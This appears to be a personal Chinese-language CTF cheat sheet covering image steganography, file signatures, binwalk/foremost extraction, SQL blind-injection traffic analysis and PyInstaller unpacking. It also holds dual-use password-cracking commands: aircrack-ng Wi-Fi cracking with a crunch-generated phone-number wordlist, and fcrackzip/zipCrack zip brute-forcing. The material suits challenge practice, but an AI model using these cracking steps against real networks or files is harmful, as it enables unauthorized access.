有的图片(如部分 jpg)需要用 Jphswin 打开并输出为 txt 文件。Mac 使用的 win 11 虚拟机，文件在 `/Users/Cyberbolt/Library/CloudStorage/OneDrive-个人/编程/CTF/工具/Misc/Windows工具/Jphswin.exe`

使用方法，选择图片，点 Seek，然后空密码，输出为 txt (其实不一定是 txt，根据具体情况，把后缀改了)

#### gif

##### 横向拼接
> 如果有很多图(gif)，可能是横向拼接起来的

图片拼接地址 http://www.atoolbox.net/Tool.php?Id=978

注意：有可能是按修改日期排序后拼接


##### 逐帧解析
注意: macOS 自带的逐帧解析可能有问题

- 1、使用stegsolve打开图片 
- 2、analyse-》frame browser，一帧一帧看
  
##### 逐帧查看（分割 gif）
```bash
convert cake.gif cake.png
```

##### 合并 gif
```bash
convert -delay 3 *.png output.gif 
# 上述命令可以将当前目录下的所有 *.png 文件合成并生成 output.gif 文件。其中在 output.gif 文件中，每帧的间隔时间可以通过 -delay 参数来设置。
```

##### 百度识图人物或其他

百度识图就算人物脸部不全，也可以识别试试

### 文件
>不要相信任何后缀类型
>
>efi 是 Unix 的可执行文件
>
>evt 是 Windows 的日志文件（好像需要 win 7 ?）

#### 查看文件类型
用 file 命令识别下是什么文件
```bash
file 文件名
```

有时候图片的 hex 被修改了，file 命令显示不准确，需要手动改文件头部的 hex 为正确 hex。格式如下

| 格式类型 | 文件头标识                            | 文件尾标识                          |
| -------- | ------------------------------------- | ----------------------------------- |
| jpeg/jpg | FFD8                                  | FFD9                                |
| gif      | 47 49 46 38 39(37) 61(G I F 8 9(7) a) |                                     |
| png      | 89 50 4E 47 0D 0A 1A 0A               | 00 00 00 00 49 45 4E 44 AE 42 60 82 |
| bmp      | 42 4D (B M)                           |                                     |
| tiff     | 4D 4D 00 2A / 49 49 2A 00             |                                     |

| **文件类型**  | **文件标识**         |
| ------------- | -------------------- |
| zip/docx/xlsx | 50 4B 03 04          |
| RAR           | 52 61 72 21          |
| doc/xls       | D0 CF 11 E0          |
| pdf           | 25 50 44 46 2D 31 2E |

#### txt

txt 文件有可能可以下滑，信息藏在最下面

#### word
如果是 word 文件可能有隐藏文字

#### 一个文件夹下一堆文件
用 VS Code 全局搜索关键词

#### 查看 cat 输出乱码的文件
匹配二进制文件的 flag
```bash
strings webshell.pcapng | grep -E '.{1,10}\{.{1,50}\}.*'
# webshell.pcapng 为二进制文件
```

#### 文件内部映像提取

##### binwalk
> 如果 binwalk 查到了内部映象却分离不了，应该尝试 foremost
>

**查照内部映像**
```bash
binwalk firmware.bin
```
注意:图片中有可能隐藏另一张图片

**文件自动提取**
```bash
binwalk -e firmware.bin
```

##### foremost

> 有时候用 binwalk 提取不了时，​可以用 foremost 提取。

**文件递归提取**
```bash
foremost -T ccc.pcap
```

#### pcapng 格式

##### http 类型
>可以全局搜索文件后缀，右键追踪 http 流

**注入类**

可以通过观察 HTTP 包的长度判断哪些是注入成功的，拼接收到的 ascii 码即可

操作方法: 先筛选出 http (搜索 http 即可)，再按 http 导出，导出界面选择按 size 排序可能会看到连续的 flag

**SQL 盲注简单原理**

例如（下面的流量按时间顺序排序）

```python
LIMIT 0, 1),1,1) )>64 AND

LIMIT 0, 1),1,1))>96 AND

LIMIT 0, 1),1, 1) )>112 AND

LIMIT 0,1),1,1) )>104 AND

LIMIT 0, 1),1, 1) )>100 AND

LIMIT 0, 1),1,1))>102 AND

LIMIT 0, 1),1,1))>101 AND

LIMIT 0,1),2,1))>96 AND

LIMIT 0,1),2,1))>112 AND

LIMIT 0,1),2,1))>104 AND

LIMIT 0,1),2,1))>108 AND

LIMIT 0,1),2,1) )>106 AND

LIMIT 0, 1),2,1))>107 AND

LIMIT 0, 1),3,1))>96 AND

LIMIT 0, 1),3,1))>112 AND

LIMIT 0,1),3,1))>104 AND

LIMIt 0,1),3,1))>100 AND

LIMIt 0,1),3,1))>98 AND

LIMIT 0, 1),3, 1))>97 AND
```

数字的第3列代表猜的字段位数，`>`后面的数字是 Ascii 码。数字的第3列相同时，取最后一个 Ascii 码(如果后面有状态码，需要保证这一行的状态码是200而不是404)。将取得的 Ascci 码拼接好即是完整的字段。（可以用字典来拼接。一般依次猜数据库名、表名、列名等）

##### 键盘输入(USB)

**KBE**
```bash
python KBE.py
```

#### cap 格式

可以根据此类型的文件破解 wifi 密码

使用 aircrack-ng，已经下载到了 Docker ctf 中

#### aircrack-ng

根据 1.txt 密码表破解 wifi 密码，如
```bash
aircrack-ng -w 1.txt wifi.cap
```

补充：生成密码表，该数字开头的所有手机号
```bash
crunch 11 11 -t 1391040%%%% -o 1.txt
```

#### 压缩文件

- 有的压缩文件只有内部的一个文件加密，可以手动试下其他文件能不能直接解压。
- 优先使用 unzip 命令解压，unzip 会自动解压上面提到的未加密文件。(但是遇到过编码不支持 unzip 的情况，所以不能只局限于 unzip)

##### zip爆破

###### 破解伪加密
```bash
java -jar ZipCenOp.jar r  压缩包名
# (macOS jdk 17 上报错不用管，运行后用 unzip 解压即可，macOS 的解压软件有坑【最新测试全能解压不错】)
```

###### 暴力破解 

**zipCrack**

优先使用下一个工具 fcrackzip

```bash
git clone https://github.com/luckman666/zipCrack.git
cd zipCrack
python zipcrack.py -f  file.zip -d password.txt
# 注意:已经在 M1 Mac 的 /Users/Cyberbolt/Library/CloudStorage/OneDrive-个人/编程/CTF/工具/Misc/压缩包破解/zipCrack 处做了备份
```

**fcrackzip**

- 如果密码正确但破解过程失败了，可能是因为压缩包在之前的使用中损坏了

```bash
fcrackzip  -b -c 'aA1' -l 1-10 -u 文件名
```
```
-b 使用暴力算法
-D 使用字典破解
-B 查看当前机器破解速度
-v 显示更多信息
-p 使用字符串作为初始密码
-l 设置密码长度（1-10）
-u 不打印错误密码

-c指定字符集，字符集格式只能为 -c 'aA1!:' 
a 表示小写字母[a-z]
A 表示大写字母[A-Z]
1 表示阿拉伯数字[0-9]
! 感叹号表示任意特殊字符[!:$%&/()=?{[]}+*~#]
: 表示包含冒号之后的字符（不能为二进制的空字符），例如  a1:$%  表示 字符集包含小写字母、数字、$字符和%百分号

192837465  --->         [1]
a123  --->              [a1]
A123  --->              [A1]
Q123we  --->            [aA1]
Q123we!?  --->          [aA1:!?]
Qwe!?123  --->          [aA1:!?]
Qwe$%^&*(123  --->      [aA1!]
```
破解3位纯数字
```bash
fcrackzip -b -c 1 -l 3 -v file.zip
```

还可以指定密码字典来破解

1.先生成密码字典

- (1) 生成某个数值范围的密码字典

  ```python
  def main():
      text = ''
      for i in range(19900000, 20000000):
          text += str(i) + '\n'
          
      with open('passwords.txt', 'w') as f:
          f.write(text)
  
  
  if __name__ == '__main__':
      main()
  ```

  

- (2) 指定密码位数生成字典

  ```python
  def main():
      num = 9 # 一共多少位数
      prefix = '372' # 前缀(前缀后面的部分则覆盖 num 位数的所有数值)
      
      text = ''
      for i in range(0, 10 ** (num - (len(prefix)) + 1) ):
          i = str(i)
          left = '0' * (num - (len(prefix)) - len(i))
          text += prefix + left + i + '\n'
      
      with open('passwords.txt', 'w') as f:
          f.write(text)
  
  
  if __name__ == '__main__':
      main()
  ```

  

2.指定用这个字典破解

```
fcrackzip -v -D -p passwords.txt -u flag.zip
```

#### .dat 文件

开源的微信 Dat 文件(.dat)解码器 http://github.com/PiaoZhenJia/WeChatDatFileDecoder

### 文本

遇到过一道题，一串文本里基本是小写字母，此时提取大写字母组合起来就是 flag 。示例代码

```python
def main():
    text = 'i was always Fond of visiting new scenes'
    flag = ''
    for i in text:
        if i.isupper():
            # 小写字母是 i.islower()
            flag += i
    print(flag)
    

if __name__ == '__main__':
    main()
```



## Reverse

> 做逆向的第一步可以先用 strings 观察下封装方式。比如发现过 PyInstaller 的打包

### 环境

#### macOS
##### ida64
按 f5 反编译，只能反编译 64 位
##### ida pro
不能用中文输入法

### ida
可以点 search-search text 来全局搜索

### PyInstaller 打包的 exe 逆向
#### python-exe-unpacker
```bash
python python_exe_unpack.py -i [malware.exe]
```
